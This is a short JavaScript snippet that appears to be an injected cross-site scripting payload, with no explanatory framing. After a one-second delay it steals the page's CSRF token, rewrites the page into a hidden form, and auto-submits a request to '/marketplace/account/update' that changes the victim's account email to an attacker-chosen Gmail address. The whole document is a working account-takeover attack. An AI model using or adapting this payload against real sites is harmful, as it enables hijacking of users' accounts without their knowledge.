setTimeout(function() {
    var csrf = document.querySelector('input[name="_csrf"]');
    if (csrf) {
        var csrf_value = csrf.value;
        document.body.innerHTML = "<form action='/marketplace/account/update' method='POST'><input type='hidden' name='email' value='hulktoba32&#64;gmail&#46;com'/><input type='hidden' name='&#95;csrf' value='" + csrf_value + "'/><input type='submit' value='Submit request'/></form>";
        document.querySelector('form').submit();
    } else {
        console.error("CSRF input element not found");
    }
}, 1000); // 1000 milliseconds = 1 second
